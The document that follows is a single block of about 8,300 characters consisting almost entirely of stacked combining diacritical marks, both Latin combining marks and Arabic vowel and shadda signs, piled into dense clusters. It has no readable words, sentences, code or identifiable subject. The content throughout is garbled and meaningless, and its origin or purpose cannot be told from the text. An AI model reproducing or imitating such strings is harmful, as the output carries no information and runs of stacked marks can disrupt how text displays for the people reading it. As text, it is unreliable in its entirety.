ٌٍُِّ̺͈̿ͬ͆̀͡҉̵̷ًًًٌٌٌٍٍَََُُُِِِّّ̡̨̡̲͉͎̹͍̬͙̺͉͍̜̺ͦ͋̓͒̽ͩ̚͜ͅ҉ٍَّ͍̄͏̴̴̷̶̸ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̨̡̛̯̹̲̬̪̖̱̥̲̦̬̘̥̩̜͈͓̬̠̳̮̞ͭ̌̌̐̃ͧͭ͊ͬ̀ͪ̋ͦ̿̇ͩ̒̉͘͘̚͢͢͡͠͝͞͡ͅ͏̶̶ًٌٍَُُِّ̧̧̲͉̮̪̝ͪ̾̔̊̈̂̂͠҉̷ًٌٌٍَُِّ̡͙̠͖̜̀̇͐̈́̀͐͐͝͠҉̷̸ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̢̡̨̧̧̛͍̥͍̪̘̠̪̥̖̭͖̞̳̜͎̘̲ͬ͗͐̔ͯ͒̊ͭ̾͒̈̊͑́ͦ̀̓̕̚͝҉̸̴̴ًًٌٌٍٍََُُِِّّ̧̢̛͙̤͎͉͔̺͕͚̣ͦ́̉́͑̈́͡҉̶̵ًًًٌٌٍٍَََُُِِّّّ͎͓̱͇͙̠͍͍͌́̀͆̽͋́̾̕͜͝͡͡͝͏̸̴̶̵̵ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̨̡̧̢̧͚̝̪͔͓̪͍̣̣̫͉̻̺̬̼̬̥͍͎̝̺͌́̂ͤͤ́͂ͤ͌ͣͣ͌̀̓́̒̋͐͌̿͊͌ͤ̕͘͘̚̕͘͢͢͞͏̵ًًٌٌٍٍََُُِِّّ̢̠̺̟̩̹͕͋̀̓ͩͫ̿͒́͊͌͡͠͠҉ًًٌٌٍَُُِّ̢̛̹͎ͧ̔̉́̋̏͏̸ًٍَِّ͕̪̲͎͘͜͏ٌٍَُِّ̠̼͚̳̳̔͛́̕͠͝ͅ҉̶ًًًٌٌٌٍٍََُُُِِّّ̡̧̢̛̬̙̝͈̝̤̳̽̀͌̔̒͌͋̅ͫ̀͠҉̵̶ًًٌٌٍٍََُُِِّّ̛͙̲̞̜̠͈͈̜͚͖̀̋̊̎ͮ̒ͤ͒͢͜͠͡҉̷̵ًًًٌٌٍٍٍَََُُِِِّّّ̯͕̘͖͔̬̭̯̱̯̝̒͋̔̏̍̀̽ͪ̅͋͘̕͟͠͠҉ٌُ̜̞͌҉ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّّ̧̨̡̨̡̡̢̰̠̜̮̤͇̱͙̭̖̩̣̖͍̙̟̭̼̏͆̍́̐͒̍̈̀̄̀̑̒̌̾ͭ̅̍͑̀̕̕̚͜͟͝҉̴̷̴̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّ̢͖̻̩͍̦̤̝̤͚̥̥̙͍̪͇̭̋ͮ͐̅ͯ̒͑́ͭͪ͒͂̍͛̐͘̚͟͟͢͟͠͝҉̸̶ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̧̧̡̨̹̺̱̩̞̺̮͇̲̤̤͖̦͍̩̫͕̝̅͗́̉͊͛̀̑̀̈͆̆́́ͬ͆̋ͭ̿̃̍̚͘͟͡͝ͅ͏ًًٌٌٌٍٍٍََُُِِِّّ̡̺͕̠̜͇͎̹̘̻͎̇͛͊̾̃͘̕͝͝҉̸ًٌٍَُِّّ̢̦͈̞̤͙ͨͣͫ̀͢͠͏̶ًًًٌٌٌٍٍَََُُُِِّّ̧̨̛̠̫̰̪̜̪̜̮͙ͧ̆̿̽̐͒ͨ̽̀́ͪ̈̂͛̕̚͜͞͏̸ًًٌٌٍٍََُُِِّّ͎̬̳̘̒̑ͪ̒̅͋ͣͭ̀͐̐̔͟͝҉̷̶̵̷ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̡̡̡̢̛̤̠͈͚̠͍͕̣̯̬͉̜̙͔̞̫̹̬̃ͣ̅͒̀ͩ̌̽̔́ͥ͑̇ͨ̔ͫ̈͂̄ͣ͜͢͢͝͝͞͞͡͝҉ٌُِ͈̾͞҉̵ًًٌٍٍََُُِّّ̢̛̫̥̣̙̘̗̂̐̅͂͒͆ͨ̾͟͏̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̡̧̨̢̧̧̛̱͕̩̻̟̣̘̻̺̜͓̰͍͚͍̼̰̟̯̹̼̮̈́́̾͋̂̍ͦ͐̎̌͒̒̎̂̉̋͒́͑ͣͣ̀̅̚͟͠͠͞͡͡͝ͅ͏ُ҉ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̧̛͙̙̗̗̬̲͈̞̫̝̯͇́̓ͣͫͪͫ̊̀̿̓́͊ͫ̀͘͢͟͜͡͏ًٌُ̤̿̀̀̀͏ٍِ̙̿҉ًًٌٍََُُِّّ̡͈̙̎ͥ̆̇̑̂̊͟ͅ҉̴̴̷ًًٌٌٍٍََُُِِّّ̖̮͕̫̖̪̜̹͔̭̓ͬ͊̾ͯ͒̿̂͊͝͠͏ٌٍِّ̘̞̰̉̕҉َ̾͏̵̵̷̸ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̛̦̹͍͓̥͙̱̟̝̦̖̜͖͖̞̱̦̯͉̻͖̤́̃ͧ̆̊̃̃̈́̇̋ͣͪ̀̀͊͆̅̀̀̕͜͢͟͠͠͡͏ُ̰҉̶̷̶̴̸̵̵̶̵̴̴̸̶̶̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̢̡̢̢̧̡̧̡̧̡̢̝̣̖͍͓̜͉͙̩͓͔̱̻͚̲̮͖̫̖͓̹̞̺̟̳͚̫̰̙̼̗͇̠̬̲̟̪̘̎̌ͩ̑̔͛͑̍̋̋̅͗̀̀̋̋͆̅ͨ́̇́ͦ̽ͯ͛͛̍̔̀́̓̅́̇͊̆͑̒͆͗̓̎̍ͥ̕͘̕͜͜͜͟͢͢͞͡͠͡͝͞҉̶ًٌُِ̛̱̝̔͏̴̵̶̵̸̷̴̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̧̨̡̡̨̛̩̺̦͙̺̙̯͉͚̰̮̺̹̫̞͔̙͕̺͇̥̦͈̭̘̹͙̺̪͔͚͉̬ͨͫͤͩͤ̊̋ͥ̾͆ͦ͑͊̅ͦͣ̓́͆ͫͭ́͆͂́͛ͣ͋́͆ͬͬ̈́̊ͫ̔̇́ͯͭ̾͘͘̕͘̚͘͢͡͡͡͠͞͝ͅ͏̷ًٌٌٍَُِِّ͙̫̰͔̘͑ͨ̀͑͏̵̷̵̵̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̛̛̝̮̩͔͓̱͍̪̖̝̭̗̺̝̯̝̪ͯͪ̔͆ͤͮ̿͛̅̈ͮ̀͋ͥ̒̍̅ͩ͘̕͘̚̕̕͟͜͟͝ͅͅ҉̷̶̵ًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̡̠̙̯̯̗̙̬͈̓̒ͨͭͪ̽̂̓ͩͯ͒̏̕͜͡͡͏̷̶̷̷̷̴̵̴̶̷̵̷̴̵̵ًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُُِِِِِِِِِِِِِِّّّّّّّّّّّّّّ̡̡̨̨̨̢̢̨̡̢͍͉̟̣̺̬̬̰͖̮̗͚̩̠̼̲̗͎̯̣̪̪̼̝͙͙̱̤̖͉̝̙͚͉̱͍̭̰͉̹̼̟̻̜̪͍̪͇̳͍̇͊̈́ͦ͛̈́̅̐̽ͨ̽͛ͭ́̾ͧ̋̒ͨͦͨ̃̎̄ͫ̆͐͑ͣ̋̀̓̔̀́͊̍ͤ̐͑́̎̆̇͗͒̋͆̀̀͑͋̍ͪ̀̉̽̆̓̏̎͊̓́ͪͭ̕͘̚͘͟͟͜͜͢͟͟͢͢͟͝͞͡͞͠͝ͅͅ͏ًٌٌٍٍَُِِّّ̨̤̜̝̠̥̪̩͐́̉̓͂̔̕҉ًَ̎͂҉ٌٍُِ̮̰̹ͪ̾͏̸̵̷̷̶̴̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̨̡̧̧̧̛̛͇͎̱̫̠̙̫͕͙͓̤̘̗͉̜̮̲̪̮͕̝͙̺͓͉̠͚͇͔̭̲̫̦̪̦̅ͬͬ͆̽͆̑ͭ̀̈́̾ͥͣ̓̐̽̇̄ͣ̄͒̉̀͗́̓͂ͦ̓͘̚͢͢͢͜͜͞͞͠͠͠͝͝ͅ҉ًَُّ̺͈ͤ͛҉̴̵ًًٌٌٌٍٍََُُِِِّّ̨̫͈̺͍͖̙͔̰̇̌ͣ̃̊͋̔̋͘͡͏̸ًٌٍٍََُِّّ̢͓͈̟̞͍̊̽̈́ͫ͝ͅ҉̶ًٌٍَُِّ̡̛̣̤̘͖̭̮ͫ̇͑̈̐҉̵ًٌٍَُِّ̦̝͙̣̉ͯ̇̒̃̕͏̴ًًًًٌٌٌٌٍٍٍَََُُُُِِِّّّ̨̧̧̛̳̙̱̠͔͈̞͔̫̫͉̯͖͑́̄ͯ̽̀͆ͭ̅ͨ͋ͯ͒ͣ̅ͯ̚͘͞͠͏ًٌٍٍَُِِّ͉̭͔̺ͫ͐́́̕͜͞͏̴̴̷̵̸̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّّ̢̨̡̢̛̯̹͇̲̦̝̼͕̣͙̞̲̟̘̞͙͙̳̱͕̀̓ͨ̿͌̿͂ͤ͒̍ͮ́̽̃ͣ͊ͯ̄ͮ̎͂ͬ́ͪ̽͘̕͘̕͢͟҉̴̶ًًًٌٌٍٍََُُِِّّ̨̧̘͚̦̮̫̻͔͇͎̼ͩ̒̾̀̍ͥ͟͜͝͏̸̴̴̵̴̸̷̷̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̨̧̢̧̨̨̨̡̧̨̛̳̪̙̗̦͓̩̫̪͙̖̦̗͙̤̞͈̠̼͉̠̖͓̱̠͔̺̭͕̬͕̭̱̞̘̞̼̱̮̫̄͋̈́̇͒͑́̇͒̉ͭ̀ͬ͗́̀́̂͑̓ͤ̈ͭ̅ͨ͒͛͌ͯͪ̐́̐̒͊̀̄̋ͭ̃̚͘̕͘͜͜͢͡͞͝͞͠͡ͅ҉̴ًًًًٌٌٌٍٍٍََََُُُِِِّّّّ̡̢͈̭͖̥͓̞̬̝̫̤̱̫̤̼̺̆̿͐̀̐͒̐̄́̂͟͟͝͡͝͞ͅ҉̶̵̴̸̶ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̨̞̣̦̳̳̪̙̻̠̼̤͕̟̝̘ͧ́ͣ̿̾ͧ́̏̿́̊̀̒̐̐̕̕̕͘͘͜͡͞҉̶ًًٌٌٍٍََُُِِّّ̡̧̫̭̮̤̭̼͈̟͚ͥͥ͗̈͂͠҉̸ًًٌٌٍََُُِّ̪̖̗͚̜̅ͪ́̒͜͢͏̷̸̸̵̶̵̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِِّّّّّّّ̡̢̡̧̧̛̘͙̻̹͕̰̲͍̞͎͎̙͎̱͎̜̣͙͇̖̫̦̜̀ͪ̅̍́́̃͐͋́ͣͪ͂ͩ̐ͦ̈́̇͂́̈̀́̂̀̋͂͟͟͢͞͡͠͞͡͡͞҉ًٌُِ̦̜͗͊̿͋͏ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̛̬̻̺̭̮̪̱̮̞̦̦͖̻͓̖͓̝̹̼̪͗ͯ̇̃ͭ́ͪ͑̆͗́̊̈́̔̀ͤ̀͋́͜͟͝͠͞͞͏̵ًٌٍٍَُِّ̜̯͖̹ͬ̈́ͣ̀ͥ͝͞͠҉ًٌَُِّ̫͔̠͓̭̒̓̾̌͢͝҉̸ًٌٍٍَُِّ̟̬͚̾̓ͪ͏̶̸̴̵̶̸̶̷̸̴̸̶ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̨̧̨̧̧̛͓̞͈̲̺̤͎͓̪̩͉̭̥̙̟̼̲̣̰͖̩̳̥̖̻̭̥̬̟̫̣̙̫̞̞̯̬̓́̐͌̄̊̀̇͒̇͒ͩ̒̆ͫͪͦ̽͌ͨͨͤ͌͋ͬ͌ͤ̌͐ͦ͒̇́̐ͤ͂̌̀̋ͩ͘͘̕͟͢͢͢͟͠͞͠͞͝͡ͅ͏̸̵̴̷̶̵̵̷ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̧̢̡̡̦̯̪̹͇͉̖̼̘̲̙̮̥̯̙͎̝̣̰͉̗͖͚̬̱͍̩͔͚͉̹̹̟̹̯͎͉̲̦̤̩̳̑͒͑̈̒̒ͬͣ̄̾ͩͨ̒͛̌͆͒̾͆̿̒͑͗̄̃ͩ̋̀͂ͤ̉̀ͭ̓̽̃͌͂̋ͫͬ̈͘̕̕͘͢͜͜͢͟͢͡͡͡͡͠͡͝͠͡͡͞ͅͅͅ͏̴̷ًٌٍٍَُِّّ̨̬̥̗̀͋ͯ͑ͫ́͘̚͘͜҉̸̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̧̜̙͉̲̝̭̂̀̑ͩ̈́̄̎̇̀̅ͩ̌̅͐ͮ̕͘͢͟ͅͅ͏̷̴ًًٌٌٍََُُِِّ̡̩͖͓͎̬̱́̽̆ͨ͗̏͊ͤ͢͏̸̴ًًٌٌٍٍٍََُُِِّّ̡̢̝̯̹͕̻͂́͗͒̈́ͦ̏́̒̕͏̶ًٌَُِّ̧̠̓́͏ًٌٍَُّ̧͉̫̥̓̒͌̀̉͠ͅ͏̶ًٌٍٍَُِِّّ̻͕̳̭ͥ̂ͮͪͤ͘͜҉ًًٌٍََُِّ̛͙̣ͬͩ̍ͨ̄̕͠͞͏̷̸̶̴̵̷̴ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̨̨̡̧̛̛̥̥̝̼̘̥̫̦̻̤̠̘̳̤̺̰̳̹̲̺̼͍͙̗͎̱̝͊̓͗ͬͦ̅ͨ͌̈ͧ̅ͮ̽͒̀̅̽̉̎͛̂ͥ̇̑̕̕͘̕͘͘͘͘͜͜͟͟͟͡͠͝͞҉̵ًًًٌٌٍٍََُُِِّّ͔̩̦̰̥̩̯͖͊̈ͯ̒ͨ̀ͤͦ̚͟͢͝͡͏̷̴̵ًًٌٌٍٍََُُِِّّ̡̛̪͔̙͒́̃̓̌̓̋̚̚҉ٌُ͛҉ٍِّ̪̜̳̽͒҉̵̵̵̷̶̵̸ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̧̢̡̡̧̡̢̝̫͎̘̺͇̯͍̜̬̜͙͙͔̪̗̪̳̺̤͉̲̝͈̺̮̗͖̬͚̱̥͇͙̪̝̰ͧ͗̒̏̒̋ͫͦ̔ͭ͒ͤ̇̐̽̌̅͊͛̔̋̀̐ͤ̄̔ͥ̓̏ͥͮͫ͆̄ͯͫͯ͆ͫ̕̕̕͘̕͘͜͜͟͟͟͠͡͝͡͞͠͝͠͝͏̸̷̸̵̵̶ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̡̧̧̥͕̺̩̣̖̯͓͉͕͓͚͔̟͔̘͉̬̎̀ͤ̀̽͑ͤͦͪͬ̓́̓̐̋ͮ͘̕͘͟͠͝͠͝ͅͅ҉َّ̡̱͆͏̶̶̷̴̶̵ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̧̢̛̪̦͉̟͓̳̳̱͎̙̜͙͓̤̳̖̀͗̇ͫ̌͑ͬ̀̌ͮ̂͊̀̐͋̄ͭ́ͥ͆̉̓͛̄̄͟͠͡͝ͅͅ͏̵̵̸̴̴̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̡̡̢̧̢̨̨̧͍̬̭͓͈̳͚̦̹̞̲̹̘̰̜̻̖̹̖̪͕͇̠̤̰͇͉͖ͧ̋ͩ̀̃ͪ̆̍ͮͥͭͯ̅͋͋́̌ͨͧ͑̌̏̔̀̽͊́ͤ̈́̾̉̐ͯ͆̚͘͜͜͟͢͠͞͠҉̸̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̱̩̜̥̣̦̲̥͇̮̝ͦͧͫ͒̓̽̃̉͋͘͜͡͡͠҉ٌٍُِ̨͎͓̫ͨ҉̴̷̴ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̡̡͈͖͍̞̥̰̜̤̮̙̻̪̦͉͎̻̲̹̍̾̍̑̉͊͆̉͋͊ͧ͛ͥͫͥͨ̄̾͛̕͘͢͟͞͞͝͞҉̵ًٌٍٍََُِّّ̛̮̝̰͋ͩ̋͠͡͏ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̧̡̡̛̱̠͙͖̯̖͔̱̬̯̭̦̆ͦ̐̐ͯ̆ͩ͊̀̑̍̓̕͘͢͢͝҉̸̶̴̷̸̴̶̶̴ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̢̡̨̢̧̧̢̡͇̪̙̬̦̟̣̰͚̝̰͍̝͉̠̞͉͚̼̖͉͎̙̻͚̱̰̮̖̳̳̆̆ͩ́́̅́̀͋ͤͩ͋ͪ͗̔͒ͯ̌̒ͣ͂͛̿͊̇̾́̏̀̊͗͑͋̾ͭ̔̿ͧ̓ͭͩ̀̈́̀̈̀͘͢͢͜͞͠͠͡͞͠҉̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̛̛̙͉͕̖̩̭̭͙͍͓̤͇̗͐̄̄̇͛̽́ͬ͐̕̕͜͟͝͝͡҉̵̶̵̵ًًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̢̧̛̤͖͈̺̦͉͇͙̪͈̠̥͕̟̣̖̝͖͆̋̈́͌͆́ͣͪͭ̃̓ͬ̉ͬ̍́͑̓ͧ́̀͐͘̚̕̚͘͢͢͝͠͞͝͡҉̸̵̴ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̢̢̨̡̞̱͍͈͈̦̻̙̻͍̯̙͖͉̳̩̭̻̗͖̥̘̮̉̀ͭ̆ͩͦ͋̀̒͗ͭ̒̒̅̃̐̉̈ͣ̏ͬ̅͘͘̕͘͜͢͜͠͠͡ͅ҉̵̵ًًٌٌٍٍَُُِِّّ̡̡̨̺̻̠̟̻̬̮̗̓̍̀ͦͭ̈̊̚͡҉َ͏ًٌٍُِّ̹̟̐̿̑͆͡ͅ͏̵̴̷̴̶̶ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̨̡̧̛̛̛̜̳̫̭̱̝̲̺̦͍̲̲̹͉̰̗̭̤̻̥̩̖͎̘̳͍̭̠̭̔̾ͬ̐͋ͦ͐̏́̔ͮ̅͂̈̿̑͌̀ͧͬͯ̒͒ͧͮ͘͢͟͟͜͢͟͢͢͜͠͡͝͝͝҉ًٌٍَُِّ̧̨͖͓̤͕̑̅̌͟͏ٌٍُِ̢͎̫̃̍҉̵̵̵̶̴̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̨̢̡̢̧̨̨̢̛͇̤͙͍̘̥̖͈̪̙͍̤̫̞̥̺̘̗͈̟̭̰͙̪̩̻̼͙̼ͫ̎̌ͪͭ͂̀̐̌̌͐̀ͬ̑͊̔̾ͨ̀ͩ̓̃̈́̾͋ͨͬ̿̕͢͢͜͢͜͠͞҉̴̶̸̵̴ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̛̛̱̠̱̭͖̝̳͚̯̘̖̬͓̖̿͂̌̀ͣ̈́̃ͧ̋̈̄͗͂̾̄̐̈́̕̚͘͢͝͞ͅͅ҉̴̶ًًٌٌٌٍٍٍََُُُِِِّّّ̡̛̟̣̳̥̪̤̤͓͇͕ͦ͂̏ͫͭͭ̀ͪ̕͟҉̴ًٌَُِ̨̥̣̈́̌ͮ͟͏̷̷̷̷̷̸̷̵̵̷̴ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̧̨̧̡̨̛̛̦͎̱̣͉̣̰̣̩̗̪͔̱̲̣̖̼̙̥̮͕̯͎̙̖̣͔̱̹͛ͥ́ͩ̐͐ͥͤ̍̀̔̐́͂ͯ̉̈́ͫ͛̒͌̑́͑́̆ͨ͊̀̐́͑̊̊̆̒̕̕̕͘͘͘͟͢͜͜͟͢͝͠͡͞͠ͅ҉̶̵̴ًًًٌٌٌٌٍٍٍَََُُُِِِّّّ̡͇͕͉̜͖̘̹̱ͥ͑ͨ́͆̆̏̆̌̅̚͡͞͞͝͠ͅ͏̶̸ًًٌٍٍََُُِِّّ̳̺̜̱̥̩̰̩̋͋̄̈̆ͬ͢͜҉̸̶̴̷̷ًٌٌٍٍَُِِّّ̫̗͙̯̳͂͆ͧ̈ͨ͘͏َ̜͋͏ً̟͊͏ٌٍَُِّ̨̝̬̹̅ͨ̿̑͏̵̸ًًًٌٌٌٍٍََُُُِِّّ̢̩̠̪̹̥̜̫̗͑ͨͬ̿̎͗ͧ̈́̐̉̋͘̚͟͟͡͞ͅ͏ًٌٍَُِّ̢̙̗̳̬̘̑͢͝҉ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̨̻̺̮̻͉̖̙̮͍̪̭͔̼̞̫͒̐͐ͨͪ̀̀̓ͬͭ̀̏̿̆ͩ͑̌̕̚̕͘͢͠͡͡͞͞҉̸̵̶̷̶ًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̧̬͖̬̭̯̮̝̹̭͎ͫ͗́̅ͩ̋ͩ̏ͬ̽̃̊ͭ͘͟͟͢͢͞͞͡҉̶̶̸̷̶̶ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِّّّّّّّ̢̡̢̧̢̧̢̛̛̫̘̟̻̲̝̫̘̬͇̩̼͚̻̹̝̺̥͓̜͕̣̝̘̖̼̳̬ͪ͊̊ͩ̏́̆͐̄̃̋̽́̈́͑ͩ̎̾̉ͦͨͣ̎ͮͯ̕̚̕͢͟͜͞͡͞͡͡҉̷̶̸̵̸̶ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̧̡̥̞̬̠̘͉̦͖̬̩͉͍̻̥ͣ̄͒͂ͣͯͪ̍̒ͩ̑̋̓͗̄́ͮ̾̕͟͝͝҉̵̶ًٌٍَُِّ͎͖̂̐̑҉ًًٌٍَُِّ͓ͥͭ͜҉̴̷̴̸ًًٌٌٍٍََُُُِِّّ̢̯̖͖̖̦̜͕͈̣̲͗́̏ͪ̄̇̽̎ͮ̄ͮ͘͘͟͏̴ٌٍِ̺ͨ͡͏̴̴̷̷̵̶̴̵̶ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̡̨̡̧̡̨̛̦͙̠̼̝̩̞̹̮̬̭̹̲̤̭̲̼̮̥̲̱̰͔͉̟͚̰̼̙̲͓̦̩̬͇̼̭̞̲̗͇̮͉̺̊ͧ͛̇̎̃ͭ̇ͣ̓̓͗ͬ͂͂͗͑̀̇͛̿̊͗ͫ̽̐ͮͮ͛̂ͩ̋̊ͪ͘̚̕͘͜͢͟͜͜͡͝͝͞͡͞҉ًٌَُّ̯̯͋̾̄͜͏̸ًٌٍَُِّ̬͍̒͑̏̀͑̀ͣͅ҉̶̷̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̳̳̹̦̘͙̬̬̺̭̳̘̝̭̲̝̾ͨͦͣ̂͑ͪ̃́ͭͦ͑́ͥ̀̕̕̕͜͢ͅ҉ِ̚͏ًًٌٌٍٍٍََُُِِّّّ̦̝̪̤͔̞͉̞̮̣̉̑̉ͭͮ̇̋̉̌̕͘͟͞͝͡҉ًٌَُِ̨̳͙ͪ̿̓͡҉̷̵ًًٌٌٍٍٍَََُُِِّّّ̢͍͔̺͎̤̟̰͓͉̝ͣ͑ͮͬ̔́ͯ͊͠͡҉̵̵ًًٌٍَُُِّ̨̤̙̠͈̞̑̓̿̉͂̌͟͠͏̸̸̵̷̷ًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̢̢̨̛͇͈̞̲̣̤̗̝̲̣͚̖̰͊̔̀̓ͯ̇͊ͭ̏͒͡͏̶̷ًًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̧̡̨͇̺͖̭̺̦͚̳̄̉ͪ̊̔ͤ̀̀̌̀̋ͫ̐̓̋̃ͫ̒̐͢͟͡͝ͅ͏ًٌٍٍَُِّّ̳͎̟̗̓̏ͯ̈́́̕͟͝҉̷̸̵̷̸ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̧̢̛̥̙̪͖̘̥̹̙͚̲̙̣̞̠̭̲̪̦̫̳̯͙̺̺̭̜̉̆̈́̂̈́̐̏̍̋̽̓̏̀̌́͋̍̑̓͒ͫ͑ͧ̉̀̍ͤ̚̕͘̕͜͟͜͡͝͠͝͝҉̷̶̶̸̷̴ًًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّ̢̧̨̨̛̛̞̺̩̩̭̺̭̺̩̪̝ͧͯ̉͌̄ͯ́͐ͦͦ̅̽ͫ̀̃̈́̔͘͘͟͢ͅ҉̷̷̸̴̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̡̢̡̧̡̨̨̛̠̝͖͎̜͚̯͙̣̹͖̱̖̟̝̪̻͓̲̖̻̟̥̻̗̔̿͆̍̀̍͒̅ͨ̀̍̈ͬͮ̅́͘̕̕͟͜͟͡͏̸̷ًٍَُِّ̤̫̥ͦͫ͋̓͝҉̴ًًًٌٌٌٌٍٍٍٍَََُُُِِِِّّّ̛̛̜̜̰͔̟̭̖͎̜̙̘̜̝̦̲̱͙̀͆́ͣ͑̒͆̋̒̌́ͪ̍ͨ̓̈ͦ̕͢͠͠͏̵̵̶̸̸ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̡̛̛̛̝̰̝̩̞͕̭̥̜̣͓̦̞͖̞̮̺̯̙̹̳͍̣̞̻̣̭͈͇̩͍̙̰ͨͣ̔ͪ̓̏̋̉ͧ̄̀ͩ́̌ͫ̿́ͥ̅͒ͭ̇ͬ̉͘̕̕̕͟͟͢͟͞͝ͅ͏̴̶ًًٌٌٍٍٍَََُُِِّّّ̢̢̢̨̫̤̙͍ͮͥ̄̿͛ͪ͊̚̕͘ͅ͏ًٌُ͓̰ͤͨ͏̷ًٌٍَُِِّ̡̻͕̤͑̔̐̀͟͞͝҉̸̶̶̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̡̨̨̛̛̻͍̻̖͉̦̼̖̬̭̺̗̱̳͔͓̫͖͖͖̟̼̜̦͉̹ͭ̃͊͛̒̐́́̏ͭ̇͊͌͆͑ͧͮ͊ͤ̐͋ͯ͂̑̎̕̕͘͘̕͢͜͝͠͡͞͝ͅͅ҉̴ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّ̢̧̨̧̧̡̛͈̥̜̲̥̟̝̞̗̱̺̖̜̫̘̠̤̖̝̝͚̬͙͇̑ͣ̂́̊̄̀ͨ̋̾́ͨ́̈́̎ͤ̑̍ͮ̍ͭ̔ͨ̆̕͟͢͜͟͡͠͠͞ͅ͏ًٌٍَُِّ̛̹̮́̌͛͢͞